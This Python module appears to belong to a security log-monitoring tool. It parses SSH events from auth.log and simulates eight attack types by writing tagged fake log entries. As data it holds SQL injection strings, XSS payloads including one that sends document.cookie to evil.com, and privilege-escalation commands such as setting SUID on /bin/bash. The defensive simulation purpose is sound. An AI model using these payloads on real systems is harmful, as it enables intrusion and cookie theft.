"""
Log Collectors — real auth.log parser + simulation engine (8 attack types).
"""
import re, random, time
from database.store import add_log

ATTACK_IPS = ["192.168.1.105", "10.0.0.44", "172.16.0.23",
              "45.33.32.156",  "198.51.100.22", "185.220.101.0"]
NORMAL_IPS = ["192.168.1.10", "192.168.1.20", "10.10.10.5", "192.168.0.50"]
USERS      = ["root", "admin", "ubuntu", "user1", "test", "guest", "deploy"]
EVENTS     = ["ssh_login", "ftp_login", "web_request", "sudo_attempt"]

SQLI_PAYLOADS = [
    "GET /search?q=' OR 1=1 -- HTTP/1.1",
    "POST /login username=admin'--&password=x",
    "GET /api/users?id=1 UNION SELECT * FROM users--",
    "GET /items?cat=1; DROP TABLE products--",
]
XSS_PAYLOADS = [
    "GET /comment?text=<script>alert(document.cookie)</script>",
    "POST /post body=<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
    "GET /name=<svg onload=alert(1)>",
]
C2_IPS   = ["45.33.32.156", "198.51.100.22"]
PRIV_CMDS = ["sudo su -", "chmod +s /bin/bash", "/etc/sudoers", "passwd root"]

# ── Real log parser ───────────────────────────────────────────────────────────
_PATTERNS = [
    (re.compile(r'Failed password for (?:invalid user )?(\S+) from ([\d.]+)'),  'ssh_login',    'failed'),
    (re.compile(r'Accepted password for (\S+) from ([\d.]+)'),                  'ssh_login',    'success'),
    (re.compile(r'Accepted publickey for (\S+) from ([\d.]+)'),                 'ssh_login',    'success'),
    (re.compile(r'Invalid user (\S+) from ([\d.]+)'),                           'ssh_login',    'failed'),
    (re.compile(r'Connection closed by (?:invalid user )?(\S+) ([\d.]+)'),      'ssh_login',    'failed'),
]

def parse_auth_log(filepath="/var/log/auth.log"):
    entries = []
    try:
        with open(filepath, 'r', errors='replace') as f:
            for line in f.readlines()[-500:]:
                for pat, etype, status in _PATTERNS:
                    m = pat.search(line)
                    if m:
                        ip = m.group(2)
                        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ip):
                            entries.append(add_log(ip, etype, m.group(1), status, line.strip()))
                        break
    except FileNotFoundError:
        pass
    return entries

# ── Simulation engine ─────────────────────────────────────────────────────────
def simulate_brute_force(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    count = random.randint(8, 20)
    for _ in range(count):
        add_log(ip, 'ssh_login', 'root', 'failed',
                f'[SIM] Failed password for root from {ip} port {random.randint(40000,60000)} ssh2')
    return ip, count

def simulate_port_scan(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    ports = random.sample(range(1, 65535), 20)
    for p in ports:
        add_log(ip, 'port_scan', '-', 'failed',
                f'[SIM] Port scan from {ip} to port {p}')
    return ip, len(ports)

def simulate_malware(ip=None):
    ip = ip or random.choice(C2_IPS)
    for _ in range(4):
        add_log(ip, 'web_request', '-', 'success',
                f'[SIM] C2 beacon to {ip} POST /gate.php bytes=1024')
    return ip

def simulate_sql_injection(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    payload = random.choice(SQLI_PAYLOADS)
    add_log(ip, 'web_request', '-', 'failed', f'[SIM] {payload} from {ip}')
    return ip

def simulate_xss(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    payload = random.choice(XSS_PAYLOADS)
    add_log(ip, 'web_request', '-', 'failed', f'[SIM] {payload} from {ip}')
    return ip

def simulate_privilege_escalation(ip=None):
    ip = ip or random.choice(NORMAL_IPS)
    cmd = random.choice(PRIV_CMDS)
    user = random.choice(["www-data", "nobody", "user1"])
    add_log(ip, 'sudo_attempt', user, 'failed',
            f'[SIM] {user} ran: {cmd} from {ip}')
    return ip

def simulate_lateral_movement(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    for user in random.sample(USERS, 4):
        add_log(ip, 'ssh_login', user, 'success',
                f'[SIM] Accepted password for {user} from {ip}')
    return ip

def simulate_data_exfiltration(ip=None):
    ip = ip or random.choice(ATTACK_IPS)
    total = 0
    for _ in range(5):
        nb = random.randint(800_000, 2_000_000)
        total += nb
        add_log(ip, 'data_transfer', '-', 'success',
                f'[SIM] Data transfer from {ip} bytes={nb}')
    return ip, total // 1_000_000

def simulate_mixed(n=10):
    fns = [simulate_brute_force, simulate_port_scan, simulate_sql_injection,
           simulate_xss, simulate_lateral_movement]
    for _ in range(n):
        random.choice(fns)()

SIM_MAP = {
    "brute_force":          simulate_brute_force,
    "port_scan":            simulate_port_scan,
    "malware":              simulate_malware,
    "sql_injection":        simulate_sql_injection,
    "xss":                  simulate_xss,
    "privilege_escalation": simulate_privilege_escalation,
    "lateral_movement":     simulate_lateral_movement,
    "data_exfiltration":    simulate_data_exfiltration,
    "mixed":                simulate_mixed,
}
